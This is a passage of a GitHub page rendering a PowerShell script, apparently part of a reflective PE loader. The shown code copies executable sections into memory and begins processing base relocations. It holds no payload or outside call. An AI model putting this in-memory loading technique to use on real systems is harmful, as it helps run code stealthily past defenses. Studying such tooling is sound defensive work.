          <td id="L1630" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1630"></td>
          <td id="LC1630" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>    SizeOfRawData &gt; VirtualSize, it is because the section stored on disk has padding that we can throw away,</span></td>
        </tr>
        <tr>
          <td id="L1631" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1631"></td>
          <td id="LC1631" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>    so truncate SizeOfRawData to VirtualSize</span></td>
        </tr>
        <tr>
          <td id="L1632" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1632"></td>
          <td id="LC1632" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SizeOfRawData</span> <span class="pl-k">=</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.SizeOfRawData</span></span></td>
        </tr>
        <tr>
          <td id="L1633" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1633"></td>
          <td id="LC1633" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1634" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1634"></td>
          <td id="LC1634" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$SectionHeader<span class="pl-smi">.PointerToRawData</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1635" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1635"></td>
          <td id="LC1635" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1636" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1636"></td>
          <td id="LC1636" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SizeOfRawData</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L1637" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1637"></td>
          <td id="LC1637" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1638" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1638"></td>
          <td id="LC1638" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1639" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1639"></td>
          <td id="LC1639" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$SizeOfRawData</span> <span class="pl-k">-gt</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualSize</span></span>)</td>
        </tr>
        <tr>
          <td id="L1640" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1640"></td>
          <td id="LC1640" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1641" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1641"></td>
          <td id="LC1641" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$SizeOfRawData</span> <span class="pl-k">=</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualSize</span></span></td>
        </tr>
        <tr>
          <td id="L1642" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1642"></td>
          <td id="LC1642" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1643" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1643"></td>
          <td id="LC1643" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1644" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1644"></td>
          <td id="LC1644" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$SizeOfRawData</span> <span class="pl-k">-gt</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1645" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1645"></td>
          <td id="LC1645" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1646" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1646"></td>
          <td id="LC1646" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Test-MemoryRangeValid</span> <span class="pl-k">-</span>DebugString <span class="pl-s"><span class="pl-pds">&quot;</span>Copy-Sections::MarshalCopy<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$SectionDestAddr</span> <span class="pl-k">-</span>Size <span class="pl-smi">$SizeOfRawData</span> <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1647" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1647"></td>
          <td id="LC1647" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::Copy(<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span> [<span class="pl-k">Int32</span>]<span class="pl-smi">$SectionHeader<span class="pl-smi">.PointerToRawData</span></span><span class="pl-k">,</span> <span class="pl-smi">$SectionDestAddr</span><span class="pl-k">,</span> <span class="pl-smi">$SizeOfRawData</span>)</td>
        </tr>
        <tr>
          <td id="L1648" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1648"></td>
          <td id="LC1648" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1649" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1649"></td>
          <td id="LC1649" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1650" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1650"></td>
          <td id="LC1650" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space</span></td>
        </tr>
        <tr>
          <td id="L1651" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1651"></td>
          <td id="LC1651" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$SectionHeader<span class="pl-smi">.SizeOfRawData</span></span> <span class="pl-k">-lt</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualSize</span></span>)</td>
        </tr>
        <tr>
          <td id="L1652" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1652"></td>
          <td id="LC1652" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1653" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1653"></td>
          <td id="LC1653" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Difference</span> <span class="pl-k">=</span> <span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualSize</span></span> <span class="pl-k">-</span> <span class="pl-smi">$SizeOfRawData</span></td>
        </tr>
        <tr>
          <td id="L1654" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1654"></td>
          <td id="LC1654" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$StartAddress</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$SectionDestAddr</span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$SizeOfRawData</span>))</td>
        </tr>
        <tr>
          <td id="L1655" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1655"></td>
          <td id="LC1655" class="blob-code blob-code-inner js-file-line">				<span class="pl-c1">Test-MemoryRangeValid</span> <span class="pl-k">-</span>DebugString <span class="pl-s"><span class="pl-pds">&quot;</span>Copy-Sections::Memset<span class="pl-pds">&quot;</span></span> <span class="pl-k">-</span>PEInfo <span class="pl-smi">$PEInfo</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$StartAddress</span> <span class="pl-k">-</span>Size <span class="pl-smi">$Difference</span> <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1656" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1656"></td>
          <td id="LC1656" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Win32Functions<span class="pl-smi">.memset.Invoke</span></span>(<span class="pl-smi">$StartAddress</span><span class="pl-k">,</span> <span class="pl-c1">0</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]<span class="pl-smi">$Difference</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1657" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1657"></td>
          <td id="LC1657" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1658" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1658"></td>
          <td id="LC1658" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1659" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1659"></td>
          <td id="LC1659" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1660" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1660"></td>
          <td id="LC1660" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1661" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1661"></td>
          <td id="LC1661" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1662" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1662"></td>
          <td id="LC1662" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Update-MemoryAddresses</span></td>
        </tr>
        <tr>
          <td id="L1663" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1663"></td>
          <td id="LC1663" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1664" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1664"></td>
          <td id="LC1664" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1665" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1665"></td>
          <td id="LC1665" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1666" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1666"></td>
          <td id="LC1666" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1667" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1667"></td>
          <td id="LC1667" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1668" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1668"></td>
          <td id="LC1668" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1669" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1669"></td>
          <td id="LC1669" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1670" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1670"></td>
          <td id="LC1670" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]</td>
        </tr>
        <tr>
          <td id="L1671" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1671"></td>
          <td id="LC1671" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$OriginalImageBase</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1672" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1672"></td>
          <td id="LC1672" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1673" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1673"></td>
          <td id="LC1673" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1674" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1674"></td>
          <td id="LC1674" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1675" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1675"></td>
          <td id="LC1675" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1676" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1676"></td>
          <td id="LC1676" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1677" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1677"></td>
          <td id="LC1677" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1678" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1678"></td>
          <td id="LC1678" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1679" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1679"></td>
          <td id="LC1679" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1680" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1680"></td>
          <td id="LC1680" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1681" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1681"></td>
          <td id="LC1681" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1682" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1682"></td>
          <td id="LC1682" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Int64</span>]<span class="pl-smi">$BaseDifference</span> <span class="pl-k">=</span> <span class="pl-c1">0</span></td>
        </tr>
        <tr>
          <td id="L1683" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1683"></td>
          <td id="LC1683" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$AddDifference</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span> <span class="pl-c"><span class="pl-c">#</span>Track if the difference variable should be added or subtracted from variables</span></td>
        </tr>
        <tr>
          <td id="L1684" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1684"></td>
          <td id="LC1684" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UInt32</span>]<span class="pl-smi">$ImageBaseRelocSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_BASE_RELOCATION</span></span>)</td>
        </tr>
        <tr>
          <td id="L1685" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1685"></td>
          <td id="LC1685" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1686" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1686"></td>
          <td id="LC1686" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do</span></td>
        </tr>
        <tr>
          <td id="L1687" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1687"></td>
          <td id="LC1687" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$OriginalImageBase</span> <span class="pl-k">-eq</span> [<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.EffectivePEHandle</span></span>) <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L1688" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1688"></td>
          <td id="LC1688" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">-or</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>))</td>
        </tr>
        <tr>
          <td id="L1689" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1689"></td>
          <td id="LC1689" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1690" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1690"></td>
          <td id="LC1690" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">return</span></td>
        </tr>
        <tr>
          <td id="L1691" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1691"></td>
          <td id="LC1691" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1692" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1692"></td>
          <td id="LC1692" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1693" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1693"></td>
          <td id="LC1693" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1694" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1694"></td>
          <td id="LC1694" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">elseif</span> ((<span class="pl-c1">Compare-Val1GreaterThanVal2AsUInt</span> (<span class="pl-smi">$OriginalImageBase</span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.EffectivePEHandle</span></span>)) <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1695" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1695"></td>
          <td id="LC1695" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1696" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1696"></td>
          <td id="LC1696" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$BaseDifference</span> <span class="pl-k">=</span> Sub<span class="pl-k">-</span>SignedIntAsUnsigned (<span class="pl-smi">$OriginalImageBase</span>) (<span class="pl-smi">$PEInfo<span class="pl-smi">.EffectivePEHandle</span></span>)</td>
        </tr>
        <tr>
          <td id="L1697" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1697"></td>
          <td id="LC1697" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$AddDifference</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span></td>
        </tr>
        <tr>
          <td id="L1698" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1698"></td>
          <td id="LC1698" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1699" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1699"></td>
          <td id="LC1699" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">elseif</span> ((<span class="pl-c1">Compare-Val1GreaterThanVal2AsUInt</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.EffectivePEHandle</span></span>) (<span class="pl-smi">$OriginalImageBase</span>)) <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1700" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1700"></td>
          <td id="LC1700" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1701" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1701"></td>
          <td id="LC1701" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$BaseDifference</span> <span class="pl-k">=</span> Sub<span class="pl-k">-</span>SignedIntAsUnsigned (<span class="pl-smi">$PEInfo<span class="pl-smi">.EffectivePEHandle</span></span>) (<span class="pl-smi">$OriginalImageBase</span>)</td>
        </tr>
        <tr>
          <td id="L1702" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1702"></td>
          <td id="LC1702" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1703" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1703"></td>
          <td id="LC1703" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1704" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1704"></td>
          <td id="LC1704" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified</span></td>
        </tr>
        <tr>
          <td id="L1705" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1705"></td>
          <td id="LC1705" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$BaseRelocPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress</span></span>))</td>
        </tr>
        <tr>
          <td id="L1706" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1706"></td>
          <td id="LC1706" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">while</span>(<span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1707" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1707"></td>
          <td id="LC1707" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1708" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1708"></td>
          <td id="LC1708" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>If SizeOfBlock == 0, we are done</span></td>
        </tr>
        <tr>
          <td id="L1709" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1709"></td>
          <td id="LC1709" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$BaseRelocationTable</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$BaseRelocPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_BASE_RELOCATION</span></span>)</td>
        </tr>
        <tr>
          <td id="L1710" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1710"></td>
          <td id="LC1710" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1711" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1711"></td>
          <td id="LC1711" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$BaseRelocationTable<span class="pl-smi">.SizeOfBlock</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1712" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1712"></td>
          <td id="LC1712" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1713" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1713"></td>
          <td id="LC1713" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">break</span></td>
        </tr>
        <tr>
          <td id="L1714" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1714"></td>
          <td id="LC1714" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1715" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1715"></td>
          <td id="LC1715" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1716" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1716"></td>
          <td id="LC1716" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$MemAddrBase</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$BaseRelocationTable<span class="pl-smi">.VirtualAddress</span></span>))</td>
        </tr>
        <tr>
          <td id="L1717" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1717"></td>
          <td id="LC1717" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$NumRelocations</span> <span class="pl-k">=</span> (<span class="pl-smi">$BaseRelocationTable<span class="pl-smi">.SizeOfBlock</span></span> <span class="pl-k">-</span> <span class="pl-smi">$ImageBaseRelocSize</span>) <span class="pl-k">/</span> <span class="pl-c1">2</span></td>
        </tr>
        <tr>
          <td id="L1718" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1718"></td>
          <td id="LC1718" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1719" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1719"></td>
          <td id="LC1719" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Loop through each relocation</span></td>
        </tr>
        <tr>
          <td id="L1720" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1720"></td>
          <td id="LC1720" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">for</span>(<span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> <span class="pl-smi">$NumRelocations</span>; <span class="pl-smi">$i</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L1721" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1721"></td>
          <td id="LC1721" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1722" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1722"></td>
          <td id="LC1722" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>Get info for this relocation</span></td>
        </tr>
        <tr>
          <td id="L1723" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1723"></td>
          <td id="LC1723" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$RelocationInfoPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">IntPtr</span>]<span class="pl-smi">$BaseRelocPtr</span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$ImageBaseRelocSize</span> <span class="pl-k">+</span> (<span class="pl-c1">2</span> <span class="pl-k">*</span> <span class="pl-smi">$i</span>)))</td>
        </tr>
        <tr>
          <td id="L1724" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1724"></td>
          <td id="LC1724" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">UInt16</span>]<span class="pl-smi">$RelocationInfo</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$RelocationInfoPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">UInt16</span>])</td>
        </tr>
        <tr>
          <td id="L1725" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1725"></td>
          <td id="LC1725" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1726" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1726"></td>
          <td id="LC1726" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase</span></td>
        </tr>
        <tr>
